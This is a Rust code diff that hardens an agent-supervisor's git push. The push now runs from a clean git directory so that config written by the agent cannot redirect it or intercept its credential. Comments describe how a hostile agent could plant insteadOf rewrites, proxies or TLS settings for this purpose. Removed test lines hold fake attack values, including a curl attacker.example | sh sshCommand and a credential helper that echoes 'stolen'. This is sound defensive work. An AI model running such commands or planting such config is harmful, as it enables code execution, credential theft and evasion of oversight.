@@ -2019,112 +2019,102 @@ pub async fn finalize_git(
                 //    the configured `repo.url`), never the agent-rewritable
                 //    `origin` remote in `.git/config` — so the push goes to the
                 //    configured destination, not an attacker-selected one.
-                //  - but git still applies `url.<base>.insteadOf`/`pushInsteadOf`
-                //    rewrites from the (agent-writable) local config to that very
-                //    `fetch_url`, so a planted rewrite could silently redirect the
-                //    push off-box. Strip those local-sourced rewrites first; fail
-                //    CLOSED (skip the push, retain) if they cannot be neutralized.
+                //  - the LOCAL config is agent-mutable, so rather than scrub it
+                //    in place and then spawn the push from the same checkout (a
+                //    scrub-then-use race — a detached agent helper could rewrite
+                //    `http.proxy`/TLS or `url.*` between the scrub and the spawn),
+                //    the push runs from a CLEAN git administrative context that
+                //    never reads the checkout's local/worktree config at all.
                 //  - the GLOBAL config is NOT trusted host state either: agents
                 //    inherit the daemon's `HOME` and run as the same account, so
                 //    they can plant a `url.*.insteadOf`, an `http.proxy`, or a TLS
-                //    loosening in `~/.gitconfig` that this local-only scrub never
-                //    sees — and for an HTTP credential URL a proxy would receive
-                //    the helper-supplied Basic credential. So the push runs with
-                //    the GLOBAL config isolated to `/dev/null` (no host
-                //    insteadOf/proxy/TLS applies), and every rewrite stripped from
-                //    the local config is re-asserted via `-c` (a command-line
-                //    entry outranks any included file the local scrub could not
-                //    reach). The credential is still delivered out of band by
-                //    `git()`'s host-matched helper, so the token never reaches argv.
-                match neutralize_untrusted_local_config(workspace, timeout).await {
+                //    loosening in `~/.gitconfig`. So the push runs with the GLOBAL
+                //    and SYSTEM config isolated to `/dev/null` (no host
+                //    insteadOf/proxy/TLS applies). The credential is still
+                //    delivered out of band by `git()`'s host-matched helper, so
+                //    the token never reaches argv.
+                let push_ctx = match finalize_push_context(workspace, branch).await {
+                    Ok(ctx) => Some(ctx),
                     Err(e) => {
                         log(&format!(
-                            "finalize: could not neutralize untrusted local git config before \
-                             push — {e}; skipping the push and retaining the run dir so work is \
-                             not pushed to a possibly rewritten/MITM'd destination"
+                            "finalize: could not build a clean git admin context for the push \
+                             — {e}; skipping the push and retaining the run dir so work is not \
+                             pushed to a possibly rewritten/MITM'd destination"
                         ));
                         out.retain = true;
+                        None
                     }
-                    Ok(rewrites) => {
-                        // Push to the SAME trusted source the clone used: a
-                        // relative local `repo.url` (e.g. `./origin.git`) must be
-                        // re-anchored to the supervisor cwd, not re-resolved
-                        // against the checkout (which would target the wrong — or
-                        // no — destination and report `pushed: false`).
-                        let (fetch_url, cred) = trusted_fetch_source(&repo.url);
-                        // Re-assert each scrubbed rewrite's inverse so the push
-                        // resolves the TRUSTED `fetch_url` even if an included
-                        // file re-adds the rewrite: `url.<fetch_url>.insteadOf =
-                        // <attacker-base>` turns the redirect back onto the
-                        // trusted destination. This `-c` prefix (`cfg`) is reused
-                        // for the post-error remote verification below, so that
-                        // check runs over the SAME isolated/trusted channel.
-                        let mut cfg: Vec<String> =
-                            vec!["-c".into(), "core.hooksPath=/dev/null".into()];
-                        for (key, value) in &rewrites {
-                            if let Some(base) = key
-                                .strip_prefix("url.")
-                                .or_else(|| key.strip_prefix("URL."))
-                                .and_then(|rest| {
-                                    rest.strip_suffix(".insteadOf")
-                                        .or_else(|| rest.strip_suffix(".insteadof"))
-                                        .or_else(|| rest.strip_suffix(".pushInsteadOf"))
-                                        .or_else(|| rest.strip_suffix(".pushinsteadof"))
-                                })
+                };
+                if let Some(push_ctx) = push_ctx {
+                    // Push to the SAME trusted source the clone used: a
+                    // relative local `repo.url` (e.g. `./origin.git`) must be
+                    // re-anchored to the supervisor cwd, not re-resolved
+                    // against the checkout (which would target the wrong — or
+                    // no — destination and report `pushed: false`).
+                    let (fetch_url, cred) = trusted_fetch_source(&repo.url);
+                    // The push runs from the clean context, so no agent-writable
+                    // `url.*.insteadOf`/`http.proxy`/TLS/include setting is in its
+                    // config search path. `--git-dir=<ctx>` points git at the clean
+                    // context; `core.hooksPath=/dev/null` is belt-and braces (the
+                    // clean context has no hooks, but the flag keeps the invariant
+                    // explicit). This prefix (`cfg`) is reused for the post-error
+                    // remote verification below, so that check runs over the SAME
+                    // isolated/trusted channel.
+                    let cfg: Vec<String> = vec![
+                        format!("--git-dir={}", push_ctx.dir.display()),
+                        "-c".into(),
+                        "core.hooksPath=/dev/null".into(),
+                    ];
+                    let mut args = cfg.clone();
+                    args.push("push".into());
+                    args.push("--".into());
+                    args.push(fetch_url.clone());
+                    args.push(format!("refs/heads/{branch}:refs/heads/{branch}"));
+                    // cwd is None: the clean `--git-dir` is absolute, so the push
+                    // must NOT run from the agent-mutable checkout (which would
+                    // re-introduce its local/worktree config into the search path).
+                    match git_isolated(&args, None, timeout, cred.as_ref()).await {
+                        Ok(_) => out.pushed = true,
+                        Err(e) => {
+                            // A nonzero/timed-out push does NOT prove the ref
+                            // was not updated: the server can apply the
+                            // fast-forward and only then the client loses the
+                            // response (dropped connection, timeout). Reporting
+                            // `pushed = false` here would tell the process model
+                            // the branch is unpublished, and the redelivery
+                            // would cut a DUPLICATE fallback branch for work that
+                            // is already durable. Verify the real remote tip over
+                            // the same trusted/isolated channel; only fail closed
+                            // (retain) when publication cannot be CONFIRMED.
+                            match remote_contains_branch_tip(
+                                &push_ctx,
+                                &cfg,
+                                &fetch_url,
+                                branch,
+                                cred.as_ref(),
+                                timeout,
+                            )
+                            .await
                             {
-                                cfg.push("-c".into());
-                                cfg.push(format!("url.{fetch_url}.insteadOf={base}"));
-                                let _ = value; // the rewrite target; the inverse needs only the base.
-                            }
-                        }
-                        let mut args = cfg.clone();
-                        args.push("push".into());
-                        args.push("--".into());
-                        args.push(fetch_url.clone());
-                        args.push(format!("refs/heads/{branch}:refs/heads/{branch}"));
-                        match git_isolated(&args, Some(workspace), timeout, cred.as_ref()).await {
-                            Ok(_) => out.pushed = true,
-                            Err(e) => {
-                                // A nonzero/timed-out push does NOT prove the ref
-                                // was not updated: the server can apply the
-                                // fast-forward and only then the client loses the
-                                // response (dropped connection, timeout). Reporting
-                                // `pushed = false` here would tell the process model
-                                // the branch is unpublished, and the redelivery
-                                // would cut a DUPLICATE fallback branch for work that
-                                // is already durable. Verify the real remote tip over
-                                // the same trusted/isolated channel; only fail closed
-                                // (retain) when publication cannot be CONFIRMED.
-                                match remote_contains_branch_tip(
-                                    workspace,
-                                    &cfg,
-                                    &fetch_url,
-                                    branch,
-                                    cred.as_ref(),
-                                    timeout,
-                                )
-                                .await
-                                {
-                                    Some(true) => {
-                                        log(&format!(
-                                            "finalize: push of {branch} reported an error ({e}), \
-                                             but the trusted remote already contains its commits — \
-                                             treating the push as landed"
-                                        ));
-                                        out.pushed = true;
-                                    }
-                                    confirmed => {
-                                        let why = if confirmed == Some(false) {
-                                            "the trusted remote does not contain its commits"
-                                        } else {
-                                            "the remote ref could not be verified"
-                                        };
-                                        log(&format!(
-                                            "finalize: push of {branch} failed — {e}; {why}, \
-                                             retaining the run dir so the work is not lost"
-                                        ));
-                                        out.retain = true;
-                                    }
+                                Some(true) => {
+                                    log(&format!(
+                                        "finalize: push of {branch} reported an error ({e}), \
+                                         but the trusted remote already contains its commits — \
+                                         treating the push as landed"
+                                    ));
+                                    out.pushed = true;
+                                }
+                                confirmed => {
+                                    let why = if confirmed == Some(false) {
+                                        "the trusted remote does not contain its commits"
+                                    } else {
+                                        "the remote ref could not be verified"
+                                    };
+                                    log(&format!(
+                                        "finalize: push of {branch} failed — {e}; {why}, \
+                                         retaining the run dir so the work is not lost"
+                                    ));
+                                    out.retain = true;
                                 }
                             }
                         }
@@ -2136,12 +2126,139 @@ pub async fn finalize_git(
     out
 }
 
+/// A clean, self-contained git administrative context for the credentialed
+/// finalize push and its post-error verification. It borrows the workspace's
+/// object store (via `objects/info/alternates`) and pins the work-branch tip,
+/// but carries its OWN empty `config`/`HEAD` — so no agent-writable
+/// `.git/config` / `config.worktree` / `include` chain is in the push's config
+/// search path. This removes the scrub-then-use race outright: there is no
+/// mutable local config for a detached agent helper to rewrite between a scrub
+/// and the spawn. Dropping it removes the temporary directory.
+struct FinalizePushContext {
+    /// The temporary git-dir; kept so the directory lives until the push and
+    /// any verification are done. `Drop` removes it.
+    dir: PathBuf,
+    /// The work-branch tip SHA pinned at build time (the trusted local state).
+    branch_tip: String,
+}
+
+impl Drop for FinalizePushContext {
+    fn drop(&mut self) {
+        let _ = std::fs::remove_dir_all(&self.dir);
+    }
+}
+
+/// Build a clean git administrative context for the finalize push. Rather than
+/// scrub the agent-mutable `.git/config` in place and then spawn the push from
+/// the same checkout (a scrub-then-use race), finalize runs the credentialed
+/// push from a temporary git-dir that:
+///
+///   * borrows the workspace's object store via `objects/info/alternates`, so
+///     the branch's commits are visible without copying them;
+///   * pins the work-branch tip as its own `refs/heads/<branch>` ref, so the
+///     explicit-URL push resolves the source ref; and
+///   * has an empty `config` and a `HEAD`, so git treats it as a valid
+///     repository yet reads NO agent-writable local/worktree config (and no
+///     `include`d file) — the entire class of local-config redirect/MITM is
+///     absent from the search path, not merely scrubbed-then-raced.
+///
+/// The branch tip is read from the workspace BEFORE the context is built (the
+/// workspace's refs/objects are trusted repo state; only its *config* is
+/// agent-mutable). Any failure fails CLOSED: the caller skips the push and
+/// retains the run dir rather than risk a redirect.
+async fn finalize_push_context(workspace: &CwdHandle, branch: &str) -> Result<FinalizePushContext> {
+    // Resolve the work-branch tip from the workspace's refs. This is the only
+    // workspace read the push depends on; it carries no config influence.
+    let tip = git(
+        &[
+            "rev-parse".into(),
+            "--verify".into(),
+            format!("refs/heads/{branch}^{{commit}}"),
+        ],
+        Some(workspace),
+        Duration::from_secs(30),
+        None,
+    )
+    .await
+    .context("resolving the work-branch tip for the clean push context")?;
+    let branch_tip = tip.trim().to_string();
+    if branch_tip.is_empty() {
+        bail!("the work branch {branch:?} has no resolvable tip");
+    }
+
+    // The workspace's on-disk path and object store. Resolve the real git-dir
+    // rather than assuming `<workspace>/.git`: a normal clone has a `.git`
+    // directory, but a hostile agent could replace it with a gitdir-pointer
+    // file (or the checkout could be a linked worktree), so derive the object
+    // store from git's own resolution. `--absolute-git-dir` always returns an
+    // absolute path, so no re-anchoring to the workspace is needed.
+    let git_dir = git(
+        &["rev-parse".into(), "--absolute-git-dir".into()],
+        Some(workspace),
+        Duration::from_secs(30),
+        None,
+    )
+    .await
+    .context("resolving the workspace git-dir for the clean push context")?;
+    let git_dir = git_dir.trim();
+    if git_dir.is_empty() {
+        bail!("the workspace git-dir did not resolve");
+    }
+    let objects = Path::new(git_dir).join("objects");
+    let objects = std::fs::canonicalize(&objects)
+        .with_context(|| format!("canonicalizing the object store {}", objects.display()))?;
+    if !objects.is_dir() {
+        bail!(
+            "the workspace object store {} is not a directory",
+            objects.display()
+        );
+    }
+
+    // Fresh, supervisor-owned temporary git-dir. No component is agent-influenced.
+    let uniq = format!(
+        "nano-finalize-push-{}-{}",
+        std::process::id(),
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_nanos())
+            .unwrap_or(0)
+    );
+    let dir = std::env::temp_dir().join(uniq);
+    let info = dir.join("objects").join("info");
+    std::fs::create_dir_all(&info)
+        .with_context(|| format!("creating the clean push context {}", info.display()))?;
+    std::fs::create_dir_all(dir.join("refs").join("heads"))
+        .with_context(|| "creating the clean push context refs dir".to_string())?;
+    // Borrow the workspace's object store. Write the alternates pointer before
+    // any git invocation so the context can resolve the branch tip's objects.
+    std::fs::write(info.join("alternates"), format!("{}\n", objects.display()))
+        .with_context(|| "writing the object-store alternates pointer".to_string())?;
+    // A valid repo needs a HEAD; point it at the work branch (the ref is pinned
+    // below). An empty config means no local/worktree/include state applies.
+    std::fs::write(dir.join("HEAD"), format!("ref: refs/heads/{branch}\n"))
+        .with_context(|| "writing the clean context HEAD".to_string())?;
+    std::fs::write(dir.join("config"), "")
+        .with_context(|| "writing the clean context config".to_string())?;
+    // Pin the work-branch tip as the context's own ref so the explicit-URL push
+    // resolves `refs/heads/<branch>` without touching the workspace's refs. The
+    // branch name can carry slashes (`feat/work`), so create its parent dirs.
+    let ref_path = dir.join("refs").join("heads").join(branch);
+    if let Some(parent) = ref_path.parent() {
+        std::fs::create_dir_all(parent)
+            .with_context(|| "creating the clean context ref parent dirs".to_string())?;
+    }
+    std::fs::write(&ref_path, format!("{branch_tip}\n"))
+        .with_context(|| "pinning the work-branch tip in the clean context".to_string())?;
+
+    Ok(FinalizePushContext { dir, branch_tip })
+}
+
 /// After a finalize push returns an error, decide whether the branch's commits
 /// are nevertheless durable on the trusted remote. A nonzero/timed-out
 /// `git push` is NOT proof the ref was not updated: the server can accept the
 /// fast-forward and apply it before the client sees the response. Fetch the
-/// branch from the SAME trusted `fetch_url`, under the SAME config isolation and
-/// rewrite re-assertion the push used (`cfg` carries the `-c` prefix), then:
+/// branch from the SAME trusted `fetch_url`, under the SAME clean-context
+/// isolation the push used (`cfg` carries the `--git-dir`/`-c` prefix), then:
 ///
 /// * `Some(true)` — the remote tip EQUALS or is a DESCENDANT of the local
 ///   branch tip, so every commit we meant to publish is on the remote.
@@ -2152,39 +2269,29 @@ pub async fn finalize_git(
 /// Callers fail CLOSED on `Some(false)`/`None` (retain), reporting
 /// `pushed = true` only on `Some(true)`.
 async fn remote_contains_branch_tip(
-    workspace: &CwdHandle,
+    push_ctx: &FinalizePushContext,
     cfg: &[String],
     fetch_url: &str,
     branch: &str,
     cred: Option<&GitCredential>,
     timeout: Duration,
 ) -> Option<bool> {
-    // The local branch tip is trusted repo state (just prepared/committed).
-    let local_tip = git(
-        &[
-            "rev-parse".into(),
-            "--verify".into(),
-            "-q".into(),
-            format!("refs/heads/{branch}^{{commit}}"),
-        ],
-        Some(workspace),
-        timeout,
-        None,
-    )
-    .await
-    .ok()?;
-    let local_tip = local_tip.trim().to_string();
+    // The branch tip pinned into the clean context at build time is the trusted
+    // local state (just prepared/committed); read it back from the context's own
+    // ref, never from the agent-mutable checkout.
+    let local_tip = push_ctx.branch_tip.clone();
     if local_tip.is_empty() {
         return None;
     }
     // Ask the trusted remote for the branch's current tip (no local fetch/merge
-    // side effects): `ls-remote <url> refs/heads/<branch>` → `<sha>\t<ref>`.
+    // side effects): `ls-remote <url> refs/heads/<branch>` → `<sha>\t<ref>`. Run
+    // from the clean context (cwd None) so no agent-mutable config applies.
     let mut ls = cfg.to_vec();
     ls.push("ls-remote".into());
     ls.push("--".into());
     ls.push(fetch_url.to_string());
     ls.push(format!("refs/heads/{branch}"));
-    let listing = git_isolated(&ls, Some(workspace), timeout, cred).await.ok()?;
+    let listing = git_isolated(&ls, None, timeout, cred).await.ok()?;
     let remote_tip = listing
         .lines()
         .find_map(|l| l.split_whitespace().next())
@@ -2198,158 +2305,29 @@ async fn remote_contains_branch_tip(
     }
     // Different tip: landed iff the remote is a DESCENDANT of our local tip
     // (someone fast-forwarded on top). That requires the remote object locally,
-    // so fetch it into FETCH_HEAD over the same trusted channel; if we cannot
-    // obtain it, fail closed (unconfirmed).
+    // so fetch it into the clean context's object store (via its alternate) over
+    // the same trusted channel; if we cannot obtain it, fail closed (unconfirmed).
     let mut fetch = cfg.to_vec();
     fetch.push("fetch".into());
     fetch.push("--no-tags".into());
     fetch.push("--".into());
     fetch.push(fetch_url.to_string());
     fetch.push(format!("refs/heads/{branch}"));
-    git_isolated(&fetch, Some(workspace), timeout, cred).await.ok()?;
-    let landed = git(
+    git_isolated(&fetch, None, timeout, cred).await.ok()?;
+    let landed = git_isolated(
         &[
             "merge-base".into(),
             "--is-ancestor".into(),
             local_tip,
             remote_tip,
         ],
-        Some(workspace),
+        None,
         timeout,
         None,
     )
     .await
     .is_ok();
     Some(landed)
-}
-
-/// Neutralize agent-mutable URL rewrites AND untrusted transport settings in the
-/// workspace's LOCAL git config before the finalize push. That push hands git
-/// the trusted `fetch_url` positionally, but git still applies agent-writable
-/// `.git/config` state to it:
-///   * `url.<base>.insteadOf`/`pushInsteadOf` rewrites (read from `.git/config`
-///     and any file it `include`s) can silently redirect the push off-box even
-///     though `origin` is never consulted; and
-///   * transport settings — `http.proxy` (incl. URL-scoped `http.<url>.proxy`),
-///     `http.sslVerify=false`, custom `http.sslCAInfo`/`sslCAPath`,
-///     `core.sshCommand`, `core.gitProxy`, `protocol.*` or local `credential.*`
-///     — can route the authenticated push through an attacker-controlled MITM
-///     and expose the helper-supplied credential, WITHOUT any URL rewrite.
-///
-/// Agent code controlled the checkout, so the repository-local config is
-/// untrusted: strip every local-sourced rewrite, every local transport knob,
-/// AND the local `include`/`includeIf` directives (an included file is another
-/// place any of these can hide; git does not surface included values under
-/// `--local`, but removing the directive that pulls them in disables them).
-/// Global config is handled separately: the push isolates it
-/// (`GIT_CONFIG_GLOBAL=/dev/null`) because the agent shares the daemon's `HOME`.
-///
-/// Both the repository-local scope (`.git/config`) AND the per-worktree scope
-/// (`.git/config.worktree`) are scrubbed. The worktree scope is NOT a subset of
-/// `--local`: when the agent enables `extensions.worktreeConfig`, git loads
-/// `config.worktree` on top of `.git/config` for the push, yet `git config
-/// --local --list` omits it entirely — so a `url.*.insteadOf`, `http.proxy`, or
-/// TLS setting planted there would survive a local-only scrub and restore the
-/// redirect/MITM path. `--worktree` writes/reads `config.worktree` when the
-/// extension is on and simply aliases `--local` when it is off (a harmless
-/// re-scan of the already-clean local file), so scrubbing both scopes closes
-/// the class with the same fail-closed behavior.
-///
-/// `--list` enumerates every direct key=value in the scope and always exits 0
-/// (even for an empty config), so — unlike `--get-regexp`, whose exit 1 for "no
-/// match" `git()` cannot distinguish from a real error — any `Err` here is a
-/// genuine failure and is propagated. It is read via [`git_untruncated`] so a
-/// config larger than the captured stdout tail (an agent could bury a rewrite
-/// near the start and pad the file past the cap) fails CLOSED instead of being
-/// scrubbed on a partial listing. The caller treats any `Err` as fail-closed:
-/// the push is skipped and the run dir retained rather than risk a redirect.
-///
-/// Returns the `(url.<base>.insteadOf|pushInsteadOf, value)` pairs it removed,
-/// so the caller can re-assert each rewrite's inverse via `-c` on the push
-/// itself (a legitimate host-level rewrite isolated away by `/dev/null` must be
-/// re-applied). Transport knobs are NOT re-asserted — they are purely untrusted
-/// local state and the push is safer without them.
-async fn neutralize_untrusted_local_config(
-    workspace: &CwdHandle,
-    timeout: Duration,
-) -> Result<Vec<(String, String)>> {
-    // Scrub `.git/config` first, then the per-worktree `config.worktree`. Order
-    // matters only when the extension is DISABLED (then `--worktree` aliases
-    // `--local`): the second pass re-scans the now-clean local file and finds
-    // nothing to unset, which is a safe no-op.
-    let mut rewrites = scrub_git_config_scope(workspace, timeout, "--local").await?;
-    rewrites.extend(scrub_git_config_scope(workspace, timeout, "--worktree").await?);
-    Ok(rewrites)
-}
-
-/// Scrub agent-mutable URL rewrites, transport/credential knobs, and
-/// `include`/`includeIf` directives from ONE git-config `scope` (`--local` or
-/// `--worktree`), returning the `(url.*.insteadOf|pushInsteadOf, value)` pairs
-/// it removed. Read via [`git_untruncated`] so an oversized listing fails CLOSED
-/// (propagated `Err`) rather than being scrubbed on a truncated tail. See
-/// [`neutralize_untrusted_local_config`] for the full rationale.
-async fn scrub_git_config_scope(
-    workspace: &CwdHandle,
-    timeout: Duration,
-    scope: &str,
-) -> Result<Vec<(String, String)>> {
-    let listed = git_untruncated(
-        &["config".into(), scope.into(), "--list".into()],
-        Some(workspace),
-        timeout,
-        None,
-    )
-    .await?;
-    // A multi-valued key (e.g. repeated `include.path`) appears once per value;
-    // `--unset-all` removes them all in one call, and a second `--unset-all` on
-    // the now-absent key would error (exit 5) and spuriously fail closed — so
-    // dedupe before unsetting.
-    let mut seen: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
-    let mut rewrites: Vec<(String, String)> = Vec::new();
-    for line in listed.lines().map(str::trim).filter(|l| !l.is_empty()) {
-        let (key, value) = line.split_once('=').unwrap_or((line, ""));
-        let lower = key.to_ascii_lowercase();
-        let is_rewrite = lower.ends_with(".insteadof") || lower.ends_with(".pushinsteadof");
-        let is_include = lower.starts_with("include.") || lower.starts_with("includeif.");
-        if is_rewrite {
-            rewrites.push((key.to_string(), value.to_string()));
-        }
-        if (is_rewrite || is_include || is_untrusted_transport_key(&lower))
-            && seen.insert(key.to_string())
-        {
-            git(
-                &[
-                    "config".into(),
-                    scope.into(),
-                    "--unset-all".into(),
-                    key.to_string(),
-                ],
-                Some(workspace),
-                timeout,
-                None,
-            )
-            .await?;
-        }
-    }
-    Ok(rewrites)
-}
-
-/// True for a local git-config key that controls transport/credential routing
-/// and so could redirect or MITM the authenticated finalize push if an agent
-/// planted it. Keyed on the lowercased key name so URL-scoped variants
-/// (`http.https://evil.example.proxy`) and case tricks are caught. Deliberately
-/// targets the transport surface only — core identity keys (`core.bare`,
-/// `core.repositoryformatversion`, `extensions.*`) that the repo needs to
-/// function are left intact.
-fn is_untrusted_transport_key(lower: &str) -> bool {
-    lower.starts_with("http.")
-        || lower.starts_with("https.")
-        || lower.starts_with("protocol.")
-        || lower.starts_with("credential.")
-        || matches!(
-            lower,
-            "core.sshcommand" | "core.askpass" | "core.gitproxy" | "core.fsmonitor"
-        )
 }
 
 /// Run git, returning its captured stdout (bounded to a `GIT_STDOUT_TAIL` tail).
@@ -3506,9 +3484,12 @@ mod tests {
         .await
         .unwrap();
         let url = format!("file://{}", bare.display());
+        // The verification runs from a clean push context built over the
+        // workspace's object store + branch tip.
+        let ctx = finalize_push_context(&dir, "feat/work").await.unwrap();
         // Before the branch exists on the remote: not published.
         assert_eq!(
-            remote_contains_branch_tip(&dir, &[], &url, "feat/work", None, t).await,
+            remote_contains_branch_tip(&ctx, &[], &url, "feat/work", None, t).await,
             Some(false),
             "an absent remote branch must report not-published"
         );
@@ -3527,7 +3508,7 @@ mod tests {
         .await
         .unwrap();
         assert_eq!(
-            remote_contains_branch_tip(&dir, &[], &url, "feat/work", None, t).await,
+            remote_contains_branch_tip(&ctx, &[], &url, "feat/work", None, t).await,
             Some(true),
             "an equal remote tip must confirm the push landed despite the error"
         );
@@ -4270,11 +4251,11 @@ mod tests {
 
     #[tokio::test]
     async fn finalize_push_neutralizes_insteadof_rewrite() {
-        // The finalize push hands git the trusted `fetch_url` positionally, but
-        // git still applies a local `url.<attacker>.insteadOf = <fetch_url>`
-        // rewrite to it — silently redirecting the push off-box. finalize must
-        // strip that agent-planted rewrite first, so the push lands on the
-        // TRUSTED destination despite the rewrite.
+        // The finalize push hands git the trusted `fetch_url` positionally, but a
+        // local `url.<attacker>.insteadOf = <fetch_url>` rewrite would silently
+        // redirect it off-box. finalize runs the push from a clean git admin
+        // context that never reads the checkout's local config, so the push lands
+        // on the TRUSTED destination despite the rewrite.
         let dir = git_workspace("fin-insteadof").await;
         let bare = std::env::temp_dir().join(format!(
             "nano-bare-io-{}-{}",
@@ -4378,39 +4359,55 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn neutralize_strips_untrusted_local_transport_config() {
-        // The finalize-push scrub must remove untrusted LOCAL transport config —
-        // not only URL rewrites — because a planted `http.proxy` +
-        // `http.sslVerify=false` (incl. URL-scoped variants) can route the
-        // authenticated push through an attacker MITM and leak the credential
-        // WITHOUT any insteadOf rewrite. Identity keys the repo needs to function
-        // must survive.
-        let dir = git_workspace("fin-transport").await;
+    async fn finalize_push_ignores_local_config_planted_after_context_build() {
+        // Regression for the scrub-then-use race (HIGH): the credentialed push
+        // must run from a clean git administrative context that never reads the
+        // checkout's mutable local config. A rewrite planted in `.git/config`
+        // AFTER the push context is built (standing in for a detached agent
+        // helper rewriting config between a scrub and the spawn) must NOT affect
+        // the push — the clean context has no agent-writable config in its search
+        // path, so there is nothing to race over.
+        let dir = git_workspace("fin-toctou").await;
         let t = Duration::from_secs(30);
-        // Untrusted transport knobs the agent could plant.
-        let untrusted = [
-            ("http.proxy", "http://attacker.example:8080"),
-            ("http.sslVerify", "false"),
-            ("http.https://github.com/.proxy", "http://attacker.example:8081"),
-            ("http.sslCAInfo", "/tmp/attacker-ca.pem"),
-            ("core.sshCommand", "sh -c 'curl attacker.example | sh'"),
-            ("core.gitProxy", "/tmp/attacker-proxy"),
-            ("credential.helper", "!sh -c 'echo stolen'"),
-            ("protocol.ext.allow", "always"),
-        ];
-        for (k, v) in &untrusted {
-            git(
-                &["config".into(), "--local".into(), (*k).into(), (*v).into()],
-                Some(&dir),
-                t,
-                None,
-            )
-            .await
-            .unwrap();
-        }
-        // A benign identity key that MUST be retained.
+        let bare = std::env::temp_dir().join(format!(
+            "nano-bare-toctou-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
         git(
-            &["config".into(), "--local".into(), "user.name".into(), "keep-me".into()],
+            &[
+                "init".into(),
+                "--bare".into(),
+                "--".into(),
+                bare.to_string_lossy().into_owned(),
+            ],
+            Some(&dir),
+            t,
+            None,
+        )
+        .await
+        .unwrap();
+        let mut repo = test_repo();
+        let trusted = format!("file://{}", bare.display());
+        repo.url = trusted.clone();
+        let prep = prepare_work_branch(&dir, &repo, None, Some("feat/work"), true, "u77", t).await;
+        assert_eq!(prep.working_branch.as_deref(), Some("feat/work"));
+        commit(&dir, "work to push").await;
+
+        // Build the clean push context FIRST (as finalize does), THEN plant the
+        // malicious rewrite in the checkout's local config — the exact ordering a
+        // scrub-then-use race would need to exploit.
+        let ctx = finalize_push_context(&dir, "feat/work").await.unwrap();
+        git(
+            &[
+                "config".into(),
+                "--local".into(),
+                "url.file:///nonexistent/toctou-attacker.insteadOf".into(),
+                trusted.clone(),
+            ],
             Some(&dir),
             t,
             None,
@@ -4418,60 +4415,40 @@ mod tests {
         .await
         .unwrap();
 
-        neutralize_untrusted_local_config(&dir, t).await.unwrap();
-
-        for (k, _v) in &untrusted {
-            let got = git(
-                &["config".into(), "--local".into(), "--get".into(), (*k).into()],
-                Some(&dir),
-                t,
-                None,
-            )
-            .await;
-            assert!(
-                got.is_err(),
-                "untrusted transport key {k:?} must be unset after the scrub, got {got:?}"
-            );
-        }
-        let kept = git(
-            &["config".into(), "--local".into(), "--get".into(), "user.name".into()],
-            Some(&dir),
+        // Run the push from the clean context (mirroring finalize's push args).
+        let cfg: Vec<String> = vec![
+            format!("--git-dir={}", ctx.dir.display()),
+            "-c".into(),
+            "core.hooksPath=/dev/null".into(),
+        ];
+        let mut args = cfg.clone();
+        args.push("push".into());
+        args.push("--".into());
+        args.push(trusted.clone());
+        args.push("refs/heads/feat/work:refs/heads/feat/work".into());
+        git_isolated(&args, None, t, None)
+            .await
+            .expect("the push must reach the trusted URL, ignoring the late-planted local rewrite");
+        let on_remote = git(
+            &[
+                "--git-dir".into(),
+                bare.to_string_lossy().into_owned(),
+                "rev-parse".into(),
+                "--verify".into(),
+                "refs/heads/feat/work".into(),
+            ],
+            None,
             t,
             None,
         )
-        .await
-        .expect("benign identity key must survive the scrub");
-        assert_eq!(kept.trim(), "keep-me");
+        .await;
+        assert!(
+            on_remote.is_ok(),
+            "the work branch must land on the trusted URL; a local rewrite planted after the \
+             context build must not redirect it"
+        );
         let _ = std::fs::remove_dir_all(dir_path(&dir));
-    }
-
-    #[test]
-    fn untrusted_transport_key_classification() {
-        // URL-scoped and case variants are caught (keyed on the lowercased name);
-        // core identity/extension keys are left intact.
-        for k in [
-            "http.proxy",
-            "http.sslverify",
-            "http.https://github.com/.proxy",
-            "https.proxy",
-            "core.sshcommand",
-            "core.askpass",
-            "core.gitproxy",
-            "core.fsmonitor",
-            "protocol.ext.allow",
-            "credential.helper",
-        ] {
-            assert!(is_untrusted_transport_key(k), "{k} must be untrusted");
-        }
-        for k in [
-            "core.bare",
-            "core.repositoryformatversion",
-            "extensions.objectformat",
-            "user.name",
-            "remote.origin.url",
-        ] {
-            assert!(!is_untrusted_transport_key(k), "{k} must be trusted");
-        }
+        let _ = std::fs::remove_dir_all(&bare);
     }
 
     #[tokio::test]
@@ -4487,36 +4464,6 @@ mod tests {
         let (out, trunc) = drain_capped(&b"abcdefghijk"[..], 10).await;
         assert_eq!(out, b"bcdefghijk", "only the last `cap` bytes are retained");
         assert!(trunc, "a stream over the cap reports truncation");
-    }
-
-    #[tokio::test]
-    async fn neutralize_fails_closed_on_truncated_config() {
-        // An agent can bury a rewrite near the START of `.git/config` and pad the
-        // file past the captured stdout tail so `--list` drops the rewrite from
-        // the tail. The scrub must FAIL CLOSED (Err) on a truncated listing
-        // rather than report a clean config and push to a possibly-rewritten URL.
-        let dir = git_workspace("fin-trunc").await;
-        let t = Duration::from_secs(30);
-        let cfg = dir_path(&dir).join(".git").join("config");
-        let mut blob = String::new();
-        // The hidden rewrite, first — truncation drops the leading bytes.
-        blob.push_str("[url \"file:///nonexistent/attacker\"]\n\tinsteadOf = https://github.com/o/r.git\n");
-        // Pad the listing well past GIT_STDOUT_TAIL (1 MiB) with benign entries.
-        let pad = "x".repeat(200);
-        for i in 0..8000 {
-            blob.push_str(&format!("[nano \"k{i}\"]\n\tv = {pad}\n"));
-        }
-        {
-            use std::io::Write;
-            let mut f = std::fs::OpenOptions::new().append(true).open(&cfg).unwrap();
-            f.write_all(blob.as_bytes()).unwrap();
-        }
-        let res = neutralize_untrusted_local_config(&dir, t).await;
-        assert!(
-            res.is_err(),
-            "a config listing larger than the captured stdout tail must fail closed, got {res:?}"
-        );
-        let _ = std::fs::remove_dir_all(dir_path(&dir));
     }
 
     #[tokio::test]
